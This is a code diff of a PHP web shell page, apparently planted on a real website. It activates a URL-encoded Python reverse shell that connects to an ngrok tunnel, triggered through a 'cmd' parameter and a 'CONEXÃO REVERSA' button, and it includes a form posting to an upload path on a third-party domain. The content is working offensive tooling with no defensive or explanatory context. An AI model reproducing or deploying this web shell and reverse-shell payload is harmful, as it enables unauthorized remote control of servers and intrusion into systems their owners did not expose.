@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt">
 <head>
 	<meta charset="UTF-8">
 	<title>Shell - </title>
@@ -91,14 +91,19 @@
 
 <?php
 
-	//$py = "python -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((10.0.0.1, 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([/bin/sh, -i]);"; 
+	$py = 'python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%220.tcp.ngrok.io%22,19448));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27'; 
 
 	$url_atual = "http://$_SERVER[HTTP_HOST]?cmd=".$py."";
 	echo $url_atual;
 ?>
 
 <div class="meio">
-	<br><br><a href="<?=$url_atual;?>">CONEXÃO REVERSA</a>
+<?php
+ $urlteste = $url_atual;
+		echo $urlteste;
+?>
+
+	<br><br><div onclick="location.href = '<?= $url_atual ?>';" >CONEXÃO REVERSA</div>
 </div>
 
 <form action="http://mitsubishi-modelo8.rewebmkt.com/themes/mitsubish-modelo8-homolog/assets/upload">
@@ -109,3 +114,4 @@
 </form>
 </body>
 </html>
+
